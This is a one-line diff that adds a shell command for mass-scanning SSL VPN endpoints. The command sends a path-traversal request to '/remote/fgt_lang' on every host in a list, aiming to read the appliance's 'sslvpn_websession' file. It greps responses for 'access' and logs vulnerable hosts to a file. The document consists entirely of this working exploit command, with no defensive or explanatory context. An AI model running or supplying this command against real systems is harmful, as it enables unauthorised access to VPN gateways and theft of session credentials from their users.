@@ -1,0 +1,1 @@
+python3 httpgrep.py -h 11.txt -u /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession -S body -s 'access' -t SSL -x 250 -l abokareem.txt
